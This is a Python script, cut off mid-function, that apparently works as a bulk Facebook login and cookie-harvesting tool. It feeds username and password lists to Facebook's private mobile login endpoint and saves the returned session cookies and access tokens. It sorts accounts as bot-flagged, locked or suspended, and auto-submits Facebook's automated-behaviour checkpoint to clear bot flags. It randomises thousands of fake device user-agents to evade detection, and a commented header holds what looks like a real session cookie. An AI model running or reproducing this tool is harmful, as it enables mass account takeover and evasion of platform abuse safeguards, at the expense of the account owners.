import os, sys, uuid, string, random, re, json
from random import choice as ch
from os import system as sm
try:
    import httpx, requests
    from rich import print as pr
    import PyBookAgents
    from bs4 import BeautifulSoup as bsoup
    from rich.prompt import Prompt as p1
    from concurrent.futures import ThreadPoolExecutor as ter
except:
    os.system('python3.12 -m pip install rich httpx futures')

def lines():
    print("="*os.get_terminal_size().columns)

#User-Agent
try:
  os.mkdir("/sdcard/.dev")
except:
  pass
try:
  open("/sdcard/.dev/.dev.json",'r')
except FileNotFoundError:
  os.system("curl https://raw.githubusercontent.com/pbakondy/android-device-list/master/devices.json -o /sdcard/.dev/.dev.json")
  rp("[bold red]Pls Run Again")
  exit()
mmn=[]
dalvikul=[]
fbankul=[]
def randfban():
  return ch(fbankul)
bnbmm = json.loads(open("/sdcard/.dev/.dev.json",'r').read())
for i in bnbmm:
  if "SM-" in i['model'] or 'GT-' in i['model'] or "Redmi" in i['model'] or "CPH" in i['model'] or "M200" in i['model'] or "RMX" in i['model'] or "Samsung" in i['brand'] or "Oppo" in i['brand'] or "Vivo" in i['brand'] or "Xiaomi" in i['brand'] or "Tecno" in i['brand'] or "Huawei" in i['brand'] or "HTC" in i['model'] or "ZTE" in i['model']:
    mmn.append(i['model'])
for dalv in range(random.randint(10000,50000)):
    mods=random.choice(mmn)
    ranfbpn=random.choice(['FB4A','Orca-Android'])
    ranfbpn2=random.choice(['FB4A','Orca-Android'])
    densityy = random.choice(['2.0', '2.5', '3.0',"2.25","2.625","2.75","3.375","4.0","3.5","1.5","4.5"])
    widthh = random.choice(["720", "1080", "1280","768","1440"])
    heightt = random.choice(["720", "1080", "1280", "1440", "1920","2768","2058","2094","2076","1332","2047","1344","1424","1831","2712","1848","2178","1998","1776","2646"])
    if ranfbpn2 == "FB4A":
        fbp1="katana"
    elif ranfbpn2 == "Orca-Android":
        fbp1="orca"
    else:
        fbp1=""
    if "SM-" in mods or str(mods).startswith(("SGH","EK","SAMSUNG","SHW","SCH","SC","SHV","Galaxy","YP-","SPH","Nexus")) == True:
        brand="samsung"
        android_ver=random.choice(['4.4.4','4.4.2','4.0','4.0.1','5.0.1','6.0','6.0.1','7.0.0','7','8','8.0.0','9','9.0','10','11.0','11','12','13','14'])
        fbv=random.choice([random.randint(20000000,29999999),random.randint(100000000,599999999)])
        build = random.choice([f"{random.choice(['Q','S','T'])}P1A.{random.randint(100000,999999)}.0{random.randint(10,30)}",f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"])
    elif str(mods).startswith("HTC") == True:
        #print(mods)
        brand="ZTE"
        android_ver=str(random.randint(5,14))+random.choice([".0",""])
        fbv=random.choice([random.randint(20000000,29999999),random.randint(100000000,599999999)])
        build = random.choice([f"{random.choice(['Q','S','T'])}P1A.{random.randint(100000,999999)}.0{random.randint(10,30)}",f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"])
    elif str(mods).startswith("ZTE") == True:
        #print(mods)
        brand="ZTE"
        android_ver=str(random.randint(5,14))+random.choice([".0",""])
        fbv=random.choice([random.randint(20000000,29999999),random.randint(100000000,599999999)])
        build = random.choice([f"{random.choice(['Q','S','T'])}P1A.{random.randint(100000,999999)}.0{random.randint(10,30)}",f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"])
    elif str(mods).startswith(("Huawei","HUAWEI","MTC","S4","U9","C8","MTS","St","IDEOS","H8","CM","GT","T8","U8","Personal","GM","Gr","T9","Media","MF","T-M","007","RBM","GS","GL","20","NAT","Bee","S3","ATH","CHM","CUN","Che","CHC","M3","H1","ES","FRD","G6","G7","MLA","RIO","DIG","KII","HONOR","H30","H60","H8","MAR","YAL","JAT","KSA","STK","JSN","PCT","SLL","SLA","HMA","LYA","EVR","SNE","70","CPN","HDN","CMR","SHT","JDN","BAH","HDN","AGS","BG","FIG","INE","POT","ANE","ELE","HW","ARS","CRO","CAG","DRA","MYA","ATU","MRD","DUB","LDN","JKM","FLA","BAC","KOB","Hol","SCL","DLI","LYO","BLN","PLK","AUM","DUA","LND","BND","PRA","DUK","VEN","ARE","LLD","M3","NTS","KNT","BKL","M8","ALP","RNE","NXT","LON","T1","S8","FDR","BGO","VTR","VKY","WAS","EML","CLT","VOG","P6","EVA","PE","NEO","LEO","GEM","Y3","V8","Y5","SCC","TIT","Y6","CAM","TRT","BKK","PIC","VCE","S8","BZT","MON","BZK","STK","JMM","KIW","EDI","NEM","BZA","CHT","C8","M6","VIET","D2","G3","G5","COL","STF","ORINO","CAZ")):
      brand="Huawei"
      android_ver=str(random.randint(5,14))+random.choice([".0",""])
      fbv=random.choice([random.randint(20000000,29999999),random.randint(100000000,599999999)])
      build = random.choice([f"{random.choice(['Q','S','T'])}P1A.{random.randint(100000,999999)}.0{random.randint(10,30)}",f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"])
    elif str(mods).startswith(("TECNO","H7","DP","Phantom")):
      brand="Tecno"
      android_ver=random.randint(6,14)
      build = random.choice([f"{random.choice(['Q','S','T'])}P1A.{random.randint(100000,999999)}.0{random.randint(10,30)}",f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"])
      fbv=random.choice([random.randint(20000000,29999999),random.randint(100000000,599999999)])
    elif str(mods).startswith("vivo") == True  or str(mods).startswith("V2") == True or str(mods).startswith("I2") == True or str(mods).startswith("V1") == True or str(mods).startswith("I2") == True:
      brand="vivo"
      android_ver=random.choice(['5.0','5','5.0.1','6.0','6.0.1','7.0.0','7','8','8.0.0','9','9.0','10','11.0','11','12','13','14'])
      fbv=random.choice([random.randint(20000000,29999999),random.randint(100000000,599999999)])
      build = random.choice([f"{random.choice(['Q','S','T'])}P1A.{random.randint(100000,999999)}.0{random.randint(10,30)}",f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"])
    elif "CPH" in mods or str(mods).startswith(("OPPO","PG","PF","PE","X9","A1","R7","R6","PB","PA","R2","A5","U7","R1")) == True:
        #print(mods)
        #or str(mods).startswith("PG") == True or str(mods).startswith("PF") == True or str(mods).startswith("PE") == True or str(mods).startswith("X9") == True or str(mods).startswith("PD") == True or str(mods).startswith("A1") == True or str(mods).startswith("R7") == True or str(mods).startswith("R6") == True or str(mods).startswith("PB") == True or str(mods).startswith("PA") == True or str(mods).startswith("PA") == True or str(mods).startswith("X9") == True or str(mods).startswith("R1") == True or str(mods).startswith("R2") == True or str(mods).startswith("U7") == True or str(mods).startswith("A3") == True or str(mods).startswith("A5") == True:
        brand="OPPO"
        android_ver=random.choice(['5.0','5','5.0.1','6.0','6.0.1','7.0.0','7','8','8.0.0','9','9.0','10','11.0','11','12','13','14'])
        fbv=str(random.randint(100000000,399999999))
        build = random.choice([f"{random.choice(['Q','S'])}P1A.{random.randint(100000,999999)}.0{random.randint(10,30)}",f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"])
    elif "GT-" in mods:
        brand="samsung"
        android_ver=random.choice(['4.4.2','4.4.4','4.0.2','5.1.1','4.4.2','5.0.1','5.0','5'])
        fbv=str(random.randint(20000000,29999999))
        build = random.choice([f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"])
    elif "RMX" in mods:
        brand="Realme"
        android_ver=random.choice(['6.0','6.0.1','7.0.0','7','8','8.0.0','9','9.0','10','11.0','11','12','13','14'])
        fbv=str(random.randint(300000000,599999999))
        build = random.choice([random.choice([f"{random.choice(['Q','S','T','U',])}P1A.{random.randint(100000,999999)}.0{random.randint(10,30)}"]),random.choice([f"{random.choice(['R','S','T'])}KQ1.{random.randint(100000,999999)}.0{random.randint(10,30)}"])])
    else:
        brand="Xiaomi"
        android_ver=random.choice(['6.0','6.0.1','7.0.0','7','8','8.0.0','9','9.0','10','11.0','11','12','13','14'])
        fbv=str(random.randint(300000000,599999999))
        build = random.choice([random.choice([f"{random.choice(['Q','S','T','U',])}P1A.{random.randint(100000,999999)}.0{random.randint(10,30)}"]),random.choice([f"{random.choice(['R','S','T'])}KQ1.{random.randint(100000,999999)}.0{random.randint(10,30)}"])])
    sim=random.choice(["GLOBE","TM","TNT","SMART","Verizon","Sprint","null"])
    fban=f"[FBAN/{ranfbpn2};FBAV/"+str(random.randrange(200,450))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+";FBBV/%s;FBDM/{density=%s,width=%s,height=%s};FBLC/%s;%sFBCR/%s;FBMF/%s;FBBD/%s;FBPN/com.facebook.%s;FBDV/%s;FBSV/%s;%s%sFBCA/armeabi-v7a:armeabi;]"%(fbv,densityy,widthh,heightt,ch(["en_US","en_GB","th_TH","ru_RU","de_DE","zh_CN","fr_FR","it_IT","es_ES","tl_PH"]),ch(["","FBRV/0;"]),ch([PyBookAgents.fbcr_random(),"SMART","DITO","GLOBE","TM","PLDT","VITRO","Radius"]),brand,brand,fbp1,mods,android_ver,ch(['FBBK/1;FBOP/1;','']),random.choice(["null",""]))
    fban22="[FBAN/Orca-Android;FBAV/%s.0.0.%s.%s;FBPN/com.facebook.orca;FBLC/%s;FBBV/%s;FBCR/%s;FBMF/%s;FBBD/%s;FBDV/%s;FBSV/%s;FBCA/%s;FBDM/{density=%s,width=%s,height=%s};FB_FW/1;]"%(random.randrange(300,450),random.randint(20,40),random.randint(80,150),ch(["en_US","en_GB","th_TH","ru_RU","de_DE","zh_CN","fr_FR","it_IT","es_ES","tl_PH"]),fbv,ch([PyBookAgents.fbcr_random(),sim]),brand,brand,mods,android_ver,ch(["armeabi-v7a:armeabi;","arm64-v8a:null","1906;FBSV/11;FBOP/1;FBCA/arm64-v8a:;"]),densityy,widthh,heightt)
    dalviku="Dalvik/2.1.0 (Linux; U; Android %s; %s Build/%s) %s%s"%(android_ver,mods,build,"[FBAN/FB4A;FBAV/"+str(random.randrange(200,450))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+f";FBBV/{''.join(random.choices(string.digits,k=random.randint(8,9)))};",ch([fban,fban22]))
    dalvikul.append(dalviku)
    fbankul.append(ch([fban,fban22]))
pr=p1.ask
def main():
    lines()
    #print("="*os.get_terminal_size().columns)
    rp("[bold yellow][[bold cyan]1[bold yellow]] COOKIE GETTER\n[bold yellow][[bold cyan]2[bold yellow]] CHECKER\n[bold yellow][[bold cyan]3[bold yellow]] BOT DETECTION FIXER")
    lines()
    meth=pr("[bold yellow]Choose Method")
    if meth == "1":
        cookiegg()
    elif meth == "2":
        bd()
    elif meth == "3":
        bdf()
try:
    open("/sdcard/success-cookies.txt")
except FileNotFoundError:
    sm("touch /sdcard/success-cookies.txt")
loop=1
ok=0
cp=0
def bdf():
    sm('clear')
    fi=pr("[bold yellow]Enter Your BotDetectedList(uid•pass•cookie)")
    xx=open(fi,"r").read().splitlines()
    with ter(max_workers=10) as botf:
        for v in xx:
            uid,passw,cook=v.split('•')
            botf.submit(botfix,uid,passw,cook)
botfx=0
def botfix(uid,passw,cook):
    global loop,botfx
    try:
        sys.stdout.write("\r\033[1;37mBOTFIX(%s) FIXED:-%s"%(loop,botfx))
        headers = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                # 'cookie': 'c_user=61567917550049; xs=7:ppwpe0s_zhi_MA:2:1733153653:-1:-1; fr=0WgF84LgMcJBroOAR.AWW4Kj6dc0W6kVnFVAh3mo20eKA.BnTdN0..AAA.0.0.BnTdN0.AWXPAk_w_4s; datr=dNNNZ3InvgSh4T6QypXQHIdK; sb=295NZ2ENhxs-4cex1pE3eLpC; ps_l=1; ps_n=1; m_pixel_ratio=3; wd=360x688',
                'dpr': '3',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"TECNO LH8n"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"13.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                'viewport-width': '980',
                }
        sess=requests.Session()
        #sess=httpx.Client()
        botdtc=sess.get("https://m.facebook.com",cookies={"cookie":cook},headers=headers,allow_redirects=True)
        #print(botdtc.text)
        if "automated" in botdtc.text:
            #print("\033[1;36mPABLO")
            soup=bsoup(botdtc.text,"html.parser")
            dism=soup.find("form").get("action")
            #print("\r"+dism)
            data={
                    'jazoest': re.search('name="jazoest" value="(.*?)"',botdtc.text).group(1),
                    'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"',botdtc.text).group(1)
                    }
            #rp(data)
            fix=sess.post("https://m.facebook.com%s"%(dism),cookies={"cookie":cook},headers=headers,data=data,allow_redirects=True)
            open("/sdcard/fixhtml.txt","a").write("%s\n\n"%(fix.text))
            #print(fix.url)
            if "automated" not in fix.text:
                #print("\033[1;32m[FIXED] %s|%s|s"%(uid,passw,cook))
                #token
                ua=randfban()
                headers={
                        'User-Agent': ua,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Host': 'graph.facebook.com',
                        'X-FB-Net-HNI': str(random.randint(10000,99999)),
                        'X-FB-SIM-HNI': str(random.randint(10000,99999)),
                        'X-FB-Connection-Type': 'MOBILE.LTE',
                        'X-Tigon-Is-Retry': 'False',
                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                        'x-fb-device-group': str(random.randint(1000,9999)),
                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                        'X-FB-Request-Analytics-Tags': 'graphservice',
                        'X-FB-HTTP-Engine': 'Liger',
                        'X-FB-Client-IP': 'True',
                        'X-FB-Connection-Bandwidth' : str(random.randint(20000000,30000000)),
                        'X-FB-Server-Cluster': 'True',
                        'x-fb-connection-token': f'62f8ce9f74b12f84c123cc23437a4a32'
                        #"d29d67d37eca387482a8a5b740f84f62",
                        #str(uuid.uuid4()).replace('-','')
                        }
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                data={
                  'adid': f'{uuid.uuid4()}',
                  'format': 'json',
                  'device_id': f'{uuid.uuid4()}',
                  'cpl': 'true',
                  'family_device_id': f'{uuid.uuid4()}',
                  'credentials_type': 'device_based_login_password',
                  'error_detail_type': 'button_with_disabled',
                  'source': 'device_based_login',
                  'email': uid,
                  'password': passw,
                  'access_token': accessToken,
                  'generate_session_cookies': '1',
                  'meta_inf_fbmeta': '',
                  'advertiser_id': f'{uuid.uuid4()}',
                  'currently_logged_in_userid': '0',
                  'locale': 'en_US',
                  'client_country_code': 'US',
                  'method': 'auth.login',
                  'fb_api_req_friendly_name': 'authenticate',
                  'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                  'api_key':f'62f8ce9f74b12f84c123cc23437a4a32',
                  }
                pos=httpx.post("https://b-graph.facebook.com/auth/login",headers=headers,data=data,follow_redirects=False).json()
                if "session_key" in pos:
                    print("\033[1;32m[FIXED] %s|%s|%s"%(uid,passw,cook))
                    print("\033[1;36mACCESS_TOKEN: %s"%(pos['access_token']))
                    print("\033[1;32MSAVE IN: /sdcard/botfix.txt|botaccess_token.txt")
                    open("/sdcard/botfix.txt","a").write("%s|%s|%s\n"%(uid,passw,cook))
                    open("/sdcard/botaccess_token.txt","a").write("%s\n"%(pos['access_token']))
                else:
                    pass
            else:
                pass
        else:
            print("\r\033[1;32m[ALREADY FIXED] %s|%s|\033[1;36m%s"%(uid,passw,cook))
    except Exception as e:
        time.sleep(5)
def bd():
    sm('clear')
    fi=pr("[bold yellow]Enter Your FileList(uid•pass•cookie)")
    xx=open(fi,"r").read().splitlines()
    with ter(max_workers=5) as botd:
        for o in xx:
            uid, passw, cook=o.split("•")
            botd.submit(botdetected,uid,passw,cook)
botdd=0
NBD=0
def botdetected(uid,passw,cook):
    global loop, botdd, NBD
    try:
        sys.stdout.write("\r\033[1;37mBOTDETECT(%s) BOTD:-%s NBD:-%s"%(loop,botdd,NBD))
        headers = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                # 'cookie': 'c_user=61567917550049; xs=7:ppwpe0s_zhi_MA:2:1733153653:-1:-1; fr=0WgF84LgMcJBroOAR.AWW4Kj6dc0W6kVnFVAh3mo20eKA.BnTdN0..AAA.0.0.BnTdN0.AWXPAk_w_4s; datr=dNNNZ3InvgSh4T6QypXQHIdK; sb=295NZ2ENhxs-4cex1pE3eLpC; ps_l=1; ps_n=1; m_pixel_ratio=3; wd=360x688',
                'dpr': '3',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"TECNO LH8n"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"13.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                'viewport-width': '980',
                }
        botdct=httpx.get("https://mbasic.facebook.com",cookies={"cookie": cook},follow_redirects=True,headers=headers).text
        if "automated" in botdct:
            botdd+=1 
            print("\r\033[1;35m[BOT DETECTED] %s|%s"%(uid,passw))
            print("SAVE IN: \033[1;36m/sdcard/botdetected.txt")
            open("/sdcard/botdetected.txt","a").write("%s•%s•%s\n"%(uid,passw,cook))
        elif "Approval" in botdct or "approval" in botdct:
            print("\r\033[1;31m[APPROVAL] %s|%s"%(uid,passw))
        elif "locked" in botdct or "Locked" in botdct:
            print("\r\033[1;31m[LOCKED] %s|%s"%(uid,passw))
        elif "Enter mobile number" in botdct:
            print("\r\033[1;31m[APPROVAL] %s|%s"%(uid,passw))
        elif "Confirm your identity with a video selfie" in botdct:
            print("\r\033[1;31m[CONFIRM IDENTITY] %s|%s"%(uid,passw))
        elif "Suspended" in botdct or "suspended" in botdct:
            print("\r\033[1;31m[SUSPENDED] %s|%s"%(uid,passw))
        else:
            NBD+=1
            print("\r\033[1;32m[NO BOT DETECTED] %s|%s|\033[1;36m%s"%(uid,passw,cook))
            print("\033[1;37mSAVE IN: \033[1;36m/sdcard/nobotdetected.txt")
            try:
                open("/sdcard/nobotdetected.txt","r").read()
            except FileNotFoundError:
                os.system("touch /sdcard/nobotdetected.txt")
            if uid in open("/sdcard/nobotdetected.txt","r").read():
                pass
            else:
                open("/sdcard/nobotdetected.txt","a").write("%s|%s|%s\n"%(uid,passw,cook))
        loop+=1
    except Exception as e:
        time.sleep(5)
def cookiegg():
    sm('clear')
    fi=p1.ask("[bold yellow]Enter Account List")
    xx=open(fi,"r").read().splitlines()
    with ter(max_workers=5) as cg:
        for i in xx:
            try:
              uid,passw=i.split("|")
            except:
              print(i+"\033[1;36mPABLO")
            cg.submit(cookieg,uid,passw)
def cookieg(uid,passw):
    global loop,ok,cp
    try:
        sys.stdout.write("\r\033[1;37mCOOKIE(%s)OK:-%s CP:-%s"%(loop,ok,cp))
        ua=randfban()
        #ua=randfban()+"','"+randfban()
        headers={
          'User-Agent': ua,
          'Content-Type': 'application/x-www-form-urlencoded',
          'Host': 'graph.facebook.com',
          'X-FB-Net-HNI': str(random.randint(10000,99999)),
          'X-FB-SIM-HNI': str(random.randint(10000,99999)),
          'X-FB-Connection-Type': 'MOBILE.LTE',
          'X-Tigon-Is-Retry': 'False',
          'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
          'x-fb-device-group': str(random.randint(1000,9999)),
          'X-FB-Friendly-Name': 'ViewerReactionsMutation',
          'X-FB-Request-Analytics-Tags': 'graphservice',
          'X-FB-HTTP-Engine': 'Liger',
          'X-FB-Client-IP': 'True',
          'X-FB-Connection-Bandwidth' : str(random.randint(20000000,30000000)),
          'X-FB-Server-Cluster': 'True',
          'x-fb-connection-token': f'62f8ce9f74b12f84c123cc23437a4a32'
          #"d29d67d37eca387482a8a5b740f84f62",
          #str(uuid.uuid4()).replace('-','')
          }
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        data={
          'adid': f'{uuid.uuid4()}',
          'format': 'json',
          'device_id': f'{uuid.uuid4()}',
          'cpl': 'true',
          'family_device_id': f'{uuid.uuid4()}',
          'credentials_type': 'device_based_login_password',
          'error_detail_type': 'button_with_disabled',
          'source': 'device_based_login',
          'email': uid,
          'password': passw,
          'access_token': accessToken,
          'generate_session_cookies': '1',
          'meta_inf_fbmeta': '',
          'advertiser_id': f'{uuid.uuid4()}',
          'currently_logged_in_userid': '0',
          'locale': 'en_US',
          'client_country_code': 'US',
          'method': 'auth.login',
          'fb_api_req_friendly_name': 'authenticate',
          'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
          'api_key':f'62f8ce9f74b12f84c123cc23437a4a32',
          }
        pos=requests.post("https://b-graph.facebook.com/auth/login",headers=headers,data=data,allow_redirects=False).json()
        #rp(pos)
        if "session_key" in pos:
            cookies=f"sb={''.join(random.choices(string.ascii_letters+string.digits+'_',k=24))};"+';'.join(i['name']+'='+i['value'] for i in pos['session_cookies'])
            xx=requests.get('https://graph.facebook.com/'+uid+'/picture?type=normal').text
            if "Photoshop" in xx:
                ok+=1
                print("\r\033[1;32m[SUCCESS] %s|%s|%s"%(uid,passw,cookies))
                print("SAVE IN: \033[1;36m/sdcard/success-cookies.txt")
                print("\033[1;34m UA: %s"%(ua))
                if uid in open("/sdcard/success-cookies.txt","r").read():
                    pass
                else:
                    open("/sdcard/success-cookies.txt","a").write("%s•%s•%s\n"%(uid,passw,cookies))
                    open("/sdcard/at.txt","a").write("%s\n"%(pos['access_token']))
            else:
                cp+=1
                print("\r\033[1;31m[FAILED] %s|%s"%(uid,passw))
                print("\033[1;36mSAVE IN: \033[1;32m/sdcard/failed.txt")
                try:
                  open("/sdcard/failed.txt")
                except FileNotFoundError:
                  os.system("touch /sdcard/failed.txt")
                if uid in open("/sdcard/failed.txt","r").read():
                    pass
                else:
